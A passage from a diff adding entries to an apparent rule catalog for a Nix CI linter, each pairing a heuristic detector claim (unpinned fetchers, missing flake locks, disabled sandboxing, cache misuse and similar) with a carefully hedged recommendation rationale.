+        "claim": "Several steps of one job each start the same `nix develop` / `nix-shell` environment."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Every `nix develop --command` or `nix-shell --run` step starts Nix from scratch: it re-resolves the flake (or re-evaluates `shell.nix`, which has no evaluation cache and typically imports all of nixpkgs), realises the dev-shell environment, spawns a new bash that sources the stdenv setup, and re-runs the shell's `shellHook`, so hooks that install tools, create virtualenvs or print banners execute once per step. Loading the environment once with `nicknovitski/nix-develop` exports the shell's variables to `GITHUB_ENV` and its PATH entries to `GITHUB_PATH`, so later `run:` steps and third-party `uses:` actions see the toolchain without another Nix start. A job-level `defaults.run.shell: nix develop --command bash -e {0}` removes the repetition from the YAML but still starts `nix develop` in every step."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/dockertools-single-layer-image",
+      "metadataSha256": "a5cb453f10d4be0c48af3a0c1af3770931b5207067ec530f0c881533ecaac5f9",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Container images built with `dockerTools.buildImage` put the whole closure in a single layer."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "buildImage adds a single layer above any reused base layers. A changed added layer can require transferring more data than a carefully layered image, unless the destination already has the blob. Layered builders separate selected store paths up to their layer limit and group the rest; resulting boundaries and reuse depend on the closure and settings. copyToRoot/contents and runAsRoot/fakeRootCommands are not equivalent APIs. Validate file layout, ownership, permissions and runtime behavior, then measure transfer sizes before migrating."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/duplicate-nixpkgs-nodes",
+      "metadataSha256": "c90857d1143a434f42798f1fd1318909c9daf8f0e1056156a3c032da9010c653",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake input brings its own nixpkgs revision instead of following the flake's `nixpkgs`, so flake.lock holds several nixpkgs copies."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Distinct nixpkgs revisions can add source fetches, evaluation work and different derivations when those inputs are used. They do not imply that every package differs: unchanged derivations can still share store paths. A follows declaration changes the dependency revision and requires regenerating flake.lock; sharing a channel name does not establish compatibility. Review and test that change, including upstream binary-cache coverage, rather than applying it automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/fake-hash-committed",
+      "metadataSha256": "0b2253111d2b588e52d1449902e5e50b2b4fa9e1144c628696bc03549378a5cf",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": 'Placeholder hashes (`lib.fakeHash`, `""`, all-zero or `sha256-AAAA\u2026` values) must not be committed.'
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The fake-hash workflow uses an empty or well-known placeholder digest to make a fixed-output build print its actual digest. Such values normally cause a mismatch if the corresponding derivation is built; static syntax alone cannot establish that an expression is evaluated or really feeds a fetcher. Templates can intentionally contain placeholders. Review the downloaded source independently before accepting a newly printed digest. vendorHash = null is not treated as a placeholder."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/fetchgit-missing-rev",
+      "metadataSha256": "bfe8c22da1341ab85aa972d8e5301d0808f520382d25dc7886b881f632032c08",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`builtins.fetchGit` of a remote repository should declare a revision or supported content-hash pin."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "fetchGit resolves a remote ref during evaluation. Without a revision or supported content-hash pin, a mutable branch or tag can select different source over time. Pure evaluation rejects unlocked inputs if evaluated. A full revision identifies a Git object, but does not guarantee local cache presence, remote availability, identical fetcher metadata across options or deterministic downstream builds."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/fetchtarball-no-hash",
+      "metadataSha256": "50ad9c8e0ffe7b918297402b498aeef922a5fd1705b62b4d2781942275702f1c",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`builtins.fetchTarball` should declare the expected unpacked-source `sha256`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "fetchTarball downloads and unpacks during evaluation. Without an expected sha256, mutable URLs may yield different sources when cache entries expire; cache and offline settings affect revalidation. Pure evaluation rejects unpinned calls when evaluated. A declared digest checks unpacked source identity and permits reuse while the matching store object exists, but does not prevent garbage collection, guarantee availability or authenticate an unreviewed digest."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/flake-check-missing-parallel-evaluator",
+      "metadataSha256": "8c05ff0b4fc52582018163c9fdef917d16e2428a68d94495961f9cd6f1b0d5c1",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`nix flake check` runs on a flake with many outputs without a parallel evaluator or a per-output job matrix."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Evaluation can be a bottleneck for flakes with many expensive outputs. This detector counts output-shaped source bindings, not evaluated outputs, elapsed time or CPU use; helper functions, lazy branches, systems and Nix versions can change the work. Parallel evaluators or job matrices may help but add overhead. Building checks with another tool does not replace flake-check validation of other output types: retain nix flake check --no-build with equivalent system/options coverage and test the combined behavior. Pin and review any additional tooling."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/flake-lock-missing-input",
+      "metadataSha256": "4618d8cb0fd159582819fa8e6ccf66b62a0298d9881b9344e81431d6b9560279",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "flake.lock is out of date with flake.nix: an input has no lock entry, was changed without re-locking, or a node reference dangles."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "An added or changed input may require lock regeneration; mutable references can then resolve differently, while immutable references need not. --no-update-lock-file rejects required updates, whereas --no-write-lock-file alone does not freeze resolution. This rule compares only supported literal source forms and reports direct references to missing nodes. A consistent lock constrains sources, not all build behavior."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/flake-nixconfig-cache-not-trusted",
+      "metadataSha256": "b392dad38cc7bdd43691d62256a13ceebe4643fe6cb58f7309aea545af5d624f",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake names an additional binary cache without recognized configuration at a CI command building it."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Flake-provided substituters need appropriate acceptance and trust, or equivalent configuration outside the flake. This rule compares visible preceding installer/actions, per-command configuration and local flake targets on recognized hosted runners. External trust decisions, daemon policy and other cache sources may still provide reuse. A complete inventory is required, but it does not reveal runtime state or prove cache misses. Prefer explicitly reviewed cache URLs/keys to broadly accepting pull-request-controlled flake settings."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/flake-update-in-build-job",
+      "metadataSha256": "42836c6bd07285d507e006db18262e22061d277d1a22d9d368a4e8e36ba3e051",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A push/pull_request CI job runs `nix flake update` (or `--update-input`/`--recreate-lock-file`) before building."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Updating a lock in ordinary push/PR CI can resolve mutable inputs differently from the committed lock. Pinned or unchanged inputs need not change, other steps may preserve the result, and neither a lock nor this detector proves reproducible builds. Separating reviewed dependency updates from frozen-lock build checks makes the tested source set clearer. Explicit local-input refreshes and recognized publication paths can be intentional."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/get-env-builtin",
+      "metadataSha256": "694f611bf19f74d4dfcc732669199d44e8285c4e6967523ddd44643b18017fd4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix expressions should not read environment variables with `builtins.getEnv` during evaluation."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A demanded `builtins.getEnv` call can make evaluation depend on the calling process's environment. Under pure or restricted evaluation it returns an empty string. This can change derived results, but an unused lazy reference need not be called or affect a derivation. Values embedded in derivation attributes can be serialized into `.drv` files in the normally world-readable Nix store; merely using a value in a condition does not imply the original value is stored. Pass non-secret configuration explicitly and keep secrets outside derivations."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/git-input-for-github",
+      "metadataSha256": "81c65f0d0ffe7e687a8cc49aed5d40ef6579fd6d9d089776883b0c40de98e3cf",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake input fetches a github.com repository with `git+https://` or `git+ssh://` instead of the `github:` tarball fetcher."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A `git+\u2026` flake reference uses Git, while `github:` downloads a commit tarball. The Nix manual describes the tarball fetcher as often faster and smaller; shallow Git fetches and warm caches reduce that difference. Fetcher changes can affect authentication, source metadata such as revCount and lockfile contents, so review and re-lock them rather than treating them as behavior-preserving edits."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/imperative-install",
+      "metadataSha256": "4aa0ee8706bc6dc037ca1ea58df9f596aae41f4fc8a60f5425b71e97b576d5e6",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`nix-env -i` / `nix profile install` installs CI tools from a channel, branch or registry entry that moves."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`nix-env -i` without `-f` evaluates `~/.nix-defexpr`, i.e. the user's channels, whose nixpkgs revision is whatever the image or the last `nix-channel --update` fetched; `-f channel:\u2026` or a branch tarball fetches the branch head again whenever the cached tarball expires. `nix profile install nixpkgs#pkg` resolves the indirect `nixpkgs` reference through the flake registry (the global registry maps it to `github:NixOS/nixpkgs/nixpkgs-unstable`), and `github:owner/repo` without a commit follows that repository's default branch. None of these record the revision in the repository, so the tool version \u2014 and its dependency closure \u2014 changes with upstream pushes rather than with the commit under test, and an old commit cannot be re-run with the tools it was tested with. The install also mutates a user profile, which outlives the job on self-hosted runners. Taking nixpkgs from the repository's `flake.lock` (`--inputs-from .`), a commit tarball, or a `devShells` entry used through `nix develop` keeps the tools pinned and reviewable."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/import-from-derivation",
+      "metadataSha256": "a8dfb4ca5f906b3384f9487bca87d90e6daaac876e8dd49572544bf279db448e",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix expressions should not import or read files produced by a derivation during evaluation (import from derivation)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "IFD demands derivation output during evaluation. If unavailable, it may need realization before evaluation continues, and evaluators disabling IFD reject demanded uses. Existing store outputs or substitutes can avoid rebuilding. This lexical detector recognizes conventional producers/readers and selected helpers; it cannot resolve arbitrary bindings, laziness or runtime cost. IFD is not itself proof of impurity. Committing generated code or moving generation to build time can remove an evaluation dependency, but needs regeneration policy and behavioral testing."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/impure-flag-in-ci",
+      "metadataSha256": "32a22f09c7ec11ffef49f81cbfdb844c2c726c358b7d011b538e095d0d12d2da",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`--impure` (or `--no-pure-eval`) on a Nix command in CI lets evaluation depend on unrecorded runner state."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": 'Flake commands evaluate in pure mode: the result is a function of the flake source and the revisions pinned in flake.lock, which is what makes a CI result reproducible and lets a binary cache serve the same outputs everywhere. `--impure` ("Allow access to mutable paths and repositories"), `--no-pure-eval` and `--option pure-eval false` switch that off, so the expression may read environment variables through `builtins.getEnv` (the usual reason is `NIXPKGS_ALLOW_UNFREE=1`), resolve `<nixpkgs>` from whatever `NIX_PATH` the runner has, use `builtins.currentSystem`/`builtins.currentTime`, read files outside the flake by absolute path, and fetch URLs without a hash. None of that is recorded in flake.lock, so the same commit can evaluate to different derivations on another runner or a later rerun, and the impurity silently spreads to every output that depends on it. Each of these needs has a pure equivalent: nixpkgs `config` in the flake, systems enumerated in `outputs`, inputs declared and locked.'
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/indirect-input",
+      "metadataSha256": "63f9fcc7f57c4f1bf888d48fceef1e52605f3a587ec8af78f326a44f37e1711a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake input is an indirect reference (`nixpkgs`, `flake:nixpkgs`, or no `url` at all) that Nix resolves through the mutable flake registries."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "An indirect flake reference names a registry entry instead of a source. Nix resolves it through the flake registries: the global registry (downloaded from the `flake-registry` setting and refreshed when older than `tarball-ttl`), then `/etc/nix/registry.json` (NixOS `nix.registry`), then `~/.config/nix/registry.json`, then `--override-flake`, the later taking precedence. flake.lock records what it resolved to once, but every `nix flake update` or re-lock resolves it again on whichever machine runs it, so a developer's `nix registry pin`, a NixOS `nix.registry` entry or a change to the global registry silently changes the source CI builds. An input with no `url`/`type`, or an `outputs` argument that is not declared under `inputs`, is the same indirect reference."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/installer-unpinned-nix-version",
+      "metadataSha256": "2755a78a5a6ad8b7be7a73968ae49e6b3e35638a1a34c5885243c97c0217c4a8",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A pinned nix-installer-action still installs whatever Nix version is newest at run time."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "DeterminateSystems/nix-installer-action downloads the most recent Determinate Nix Installer on every run, even when the action itself is pinned to a tag or commit, so the Nix version (evaluator, store schema, default settings, built-in fetchers) changes underneath a workflow whose author pinned the action for reproducibility. A Nix upgrade can change evaluation results, error on deprecated syntax, or alter `flake.lock` handling without any change in the repository. determinate-nix-action is tagged for every Determinate Nix release, so `@vX.Y.Z` installs exactly that release and Dependabot can propose upgrades as reviewable pull requests; alternatively `source-tag` pins the installer binary used by nix-installer-action."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/max-jobs-pinned-low",
+      "metadataSha256": "9a6cdf932f78f7182b91c8c1ff46805b79ad447ea394bb7e3b3edf5be67c4460",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix's `max-jobs` is pinned to a very small number on a GitHub-hosted runner."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "max-jobs limits concurrent local derivation builds; cores separately controls the parallelism a builder may use. A low explicit limit may leave capacity unused when independent uncached derivations are single-threaded. It can also be necessary to avoid memory exhaustion or oversubscription. This detector follows observed configuration precedence at build commands, but does not measure resource use, dependency parallelism or remote-daemon policy. Tune only after measuring representative builds."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/missing-flake-lock",
+      "metadataSha256": "ed193068ff9c6a19b1007a0ad47c5bd28a3d17ab05db7fbfed9720450e1f0c4d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake.nix with inputs has no flake.lock committed next to it."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "flake.lock records resolved input identities. Without it, mutable references can resolve differently between runs, unless an external lock policy or explicit immutable inputs constrain them. Local or already revision-pinned inputs do not necessarily move. Committing and reviewing the lock improves source traceability; it does not prove deterministic outputs or cache hits. This absence check requires a complete repository inventory."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/nix-build-inside-docker",
+      "metadataSha256": "48e3adbbf3f331446926712b59c6d0cda4237a8d7bba0fbe19839fb695dffd0b",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review Nix sandboxing and store-cache reuse when Dockerfile RUN instructions build with a nixos/nix-named base."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Docker's isolation boundary is not the Nix build sandbox. Some nixos/nix releases disable Nix sandboxing for container compatibility, but a name, mirror or tag does not establish the running configuration or namespace capabilities. A missed BuildKit layer can repeat Nix work, while parent layers, cache mounts and substituters may still provide reuse. Moving image construction outside Docker changes build/runtime assumptions and must be validated; it does not automatically enable sandboxing or guarantee one layer per store path."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/nix-shell-dash-p-unpinned",
+      "metadataSha256": "163cfc3f2787c3fd350858607e5c761977c53a65ebddab2a3ab60868a859a479",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Ad-hoc `nix-shell -p` / `nix run nixpkgs#\u2026` / `nix shell nixpkgs#\u2026` tools come from a moving nixpkgs branch."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`nix-shell -p pkg` evaluates `with import <nixpkgs> {}; \u2026`, so the packages come from whatever the `nixpkgs` entry of the search path (`-I`, then `NIX_PATH`, then the `nix-path` setting) points at; a `channel:nixos-unstable` or `\u2026/archive/nixos-unstable.tar.gz` entry is downloaded afresh once the tarball cache expires and follows the branch. Likewise `nix run nixpkgs#pkg` and `nix shell nixpkgs#pkg` resolve the indirect `nixpkgs` reference through the flake registry, whose global entry is `github:NixOS/nixpkgs/nixpkgs-unstable`, and nothing records the revision used. Either way the tool version (and every dependency of it) changes with upstream pushes rather than with the commit under test, so a rerun of an old commit can build or lint differently and cache hits are lost whenever the branch moves. Pinning nixpkgs to a commit, or resolving `nixpkgs` from the repository's own `flake.lock` with `--inputs-from .`, makes the tool part of the reviewed inputs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/nixpkgs-angle-bracket-path",
+      "metadataSha256": "2d2be47ce4c5252662c0e0c509daa1bd6940b500aee3764a9bdca4b9cdb1b15d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix expressions should not use `<nixpkgs>`-style lookup paths, which resolve through the machine's NIX_PATH."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Lookup paths resolve through search-path configuration, including NIX_PATH, nix-path and -I flags. That configuration may be pinned externally or may follow a mutable channel; this file-level detector does not establish which. Explicit pinned inputs make the dependency easier to audit. Pure evaluation disables ordinary external search-path resolution. A source pin is not a proof of deterministic builds or cache hits."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/nixpkgs-input-not-channel",
+      "metadataSha256": "802156a8ba153b4572a471a4cf0cbc70f61680fd9ce771f4fbc899e191a8d41a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A nixpkgs flake input tracks `master`, a `release-*` or `staging*` branch instead of a channel branch."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Development branches can advance before channel release gates finish. Channel branches are gated by selected jobs, not every package, architecture, license configuration or overlay. A development-branch lock may already have substitutes, and a channel lock may still require local builds. Inspect the chosen revision's actual substitutes before switching source policy, then review and test the changed lock."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/no-binary-cache-configured",
+      "metadataSha256": "d9eec1235dedcce2c969f639fd514240caf1ae647d4fa27ee676a3511e5ebddb",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A hosted job builds local Nix targets with no additional binary cache visible before the build."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A cache can avoid rebuilding outputs unavailable from the default substituter on fresh runners. A local target may simply reuse nixpkgs packages already in cache.nixos.org, and external machine configuration may provide another cache, so absence in the inspected repository is not proof of cache misses. Measure repeated uncached builds before adopting authenticated cache persistence; scope write credentials to trusted jobs and account for storage, transfer and exposure costs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/no-lock-update-automation",
+      "metadataSha256": "f1c8ea42a15129ca1d3c4c20b942c206992192eba624ed0237130c708ded6129",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A committed flake.lock has no Dependabot, Renovate or scheduled workflow keeping it up to date."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Committed locks require deliberate maintenance. Repository-visible Dependabot, Renovate or update workflows can make that maintenance reviewable, but external services and manual targeted updates may already provide it. A commit timestamp is not a vulnerability assessment or proof of neglect. Even a small update can change a large build closure; automation does not guarantee smaller cache misses. Review and test update pull requests before merging."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/outdated-magic-nix-cache",
+      "metadataSha256": "e757d9d5d7d6aaa427f0d1f75d62ffc04747b24f03824395c3c463d06e9cda94",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review Magic Nix Cache action refs that predate v11's restored support."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Upstream v11 explicitly restored support, removed the retirement warning and added GITHUB_CONTEXT to the downloaded daemon's environment. The action wrapper version alone does not determine the downloaded binary or prove an actual cache failure: source overrides, service configuration and GitHub Enterprise Server differ. Review runtime logs and supported versions before an upgrade or migration; neither is an unattended behavior-preserving fix."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/overlay-overrides-foundational-package",
+      "metadataSha256": "4e5f9956fd2ed735c38c138e0428d7e6d616589a7c7ae1a9717a0290a3426a1e",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Overlays should not globally replace foundational packages such as `stdenv`, `glibc`, `openssl` or `zlib`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A package-set overlay can change inputs widely, especially foundational libraries and bootstrap packages. Rebinding alone does not establish changed derivations: metadata-only overrides or equivalent values can retain store paths, and changed outputs may already exist in a cache. Evaluate the before/after derivation graph and substitutability before deciding whether to narrow an intentional override. Scoped overrides also change dependency policy and require testing."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/quick-install-implicit-flake-config-trust",
+      "metadataSha256": "93f984bb4c082f564f445bf00b07da331c5d0e1f426418ce12cd058e8dc65e2a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "nixbuild/nix-quick-install-action silently enables `accept-flake-config`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The recognized nix-quick-install-action releases append accept-flake-config = true after nix_conf when installing Nix newer than 2.13 (including 2.13.6). Flake-evaluating commands can then accept eligible top-level nixConfig settings without confirmation. This is a single-user installer, not evidence that a root-owned daemon honors every option. A false setting inside nix_conf is overwritten by the appended line; an effective NIX_CONFIG or CLI setting can override it. Review trust deliberately and preserve existing configuration when changing it. Unknown releases, dynamic versions and opaque configuration writes are not treated as established trust."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/raw-store-cache",
+      "metadataSha256": "5decec53d06ae58165b67d4189c3df9ba004d34630888ac002676515e585cf7a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Do not cache `/nix/store` or `/nix/var/nix` with actions/cache; use a Nix-aware cache."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The Nix store is only consistent together with its SQLite database (`/nix/var/nix/db/db.sqlite`), which records which store paths are valid and their references. actions/cache archives and extracts plain files as the runner user: on a multi-user install `/nix/store` is root-owned and read-only, so extraction can fail with permission errors, and restoring the store without the database (or a stale database over the one the installer just created) leaves paths Nix does not consider valid or registrations for paths that are missing. Nothing is garbage-collected before saving, so every save carries the whole store towards the 10 GB repository cache limit. nix-community/cache-nix-action merges the restored and current databases and can collect garbage before saving; a binary cache (Cachix, Attic, FlakeHub Cache) substitutes individual paths through Nix itself."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/rust-two-phase-build",
+      "metadataSha256": "18834aecae4810a40a67fa2ccc2bc7dbd237997bd26c6ebed0ce3420bbeb9e73",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Rust crates built from local source should compile dependencies in a separate, cacheable derivation."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Standard buildRustPackage separates dependency source fetching from package compilation, not necessarily dependency compilation from workspace compilation. When included local source changes, the package derivation can change, and a cache miss may rebuild dependency crates. Two-phase builders such as crane can reuse compatible compiled artifacts, but their inputs also include toolchains, features, native dependencies and build scripts, not only Cargo.lock. Custom phases and compiler caches can already provide reuse. Measure representative builds and preserve all build behavior before migrating."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/sandbox-disabled",
+      "metadataSha256": "b6e2e22006e6b277ea2eea41f131a1a22065c40c2ee0b36a620a6e769b7fc489",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "The Nix build sandbox is turned off or relaxed in CI, in flake nixConfig, or by `__noChroot`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Nix sandboxing restricts access to undeclared host state. Disabling or relaxing it can make additional inputs available, but does not establish that a derivation uses them or produces different bytes. Input-addressed store paths identify declared inputs, not a proof of deterministic output. This rule follows observed configuration precedence at build commands and also reports explicit flake requests and recognizable derivation __noChroot attributes. Restricted daemon settings, remote builders, unsupported shell code and container namespace support cannot be established statically. macOS and container jobs are conservatively omitted rather than assuming Linux defaults apply. No isolation change is automatic."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/separate-nix-build-invocations",
+      "metadataSha256": "e5ab52a4fba51738215b03a5b070657446cfd66d54d9f0055906ef9894c1466e",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Consecutive `nix build` commands in one job that could be a single `nix build` of all installables."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Each `nix build` is a separate Nix process: it locks and evaluates the flake again (shared work such as importing nixpkgs is repeated, because the evaluation cache only records final attribute values), then realises that installable's closure before the shell moves on. The next invocation cannot start building until the previous closure is finished, so while the last few derivations of one installable build, cores that `max-jobs` would let Nix use for the next one stay idle. `nix build .#a .#b` evaluates both installables in one evaluator and hands the union of their closures to one scheduler, which builds independent derivations concurrently and shares common dependencies. Out links become `result`, `result-1`, ... in installable order."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/src-whole-repo",
+      "metadataSha256": "80b495eb2732b6559b245e05899e7eed83932c652882c255c33d9beda119c403",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Derivations should not use the whole repository (`src = ./.`) as their source."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A broad source path can include files unrelated to the build. Changes to included files affect the source store path and can invalidate derivation reuse, although another cache may already contain the new result. Git-flake filtering and builder-specific filtering affect the actual file set. Selecting all necessary inputs with a fileset can reduce invalidation; omitting a required build script, fixture or generated input changes behavior. Measure and test rather than applying a guessed file list automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
